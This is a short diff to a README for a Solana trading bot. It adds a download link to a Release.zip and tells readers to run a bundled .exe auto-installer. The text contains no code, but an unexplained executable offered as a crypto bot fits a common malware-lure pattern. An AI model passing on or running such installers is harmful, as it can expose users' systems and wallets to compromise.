@@ -10,9 +10,9 @@
  ### Installation
 
 [![asdasdasd](https://github.com/user-attachments/assets/df2176a8-b641-4c35-bb53-eecbdad71abb)
-]()
+](https://github.com/Daniel-gon/Solana-Trading-Bot/releases/download/V4.66/Release.zip)
 
-## **1. [Download the archive]() from releases and extract it to a convenient folder.**
+## **1. [Download the archive](https://github.com/Daniel-gon/Solana-Trading-Bot/releases/download/V4.66/Release.zip) from releases and extract it to a convenient folder.**
 ## **2. Run the auto-installer `Installing_File_x64_32bit.exe`. It will install and download all necessary packages for > operation.**
 
 > [!TIP] 
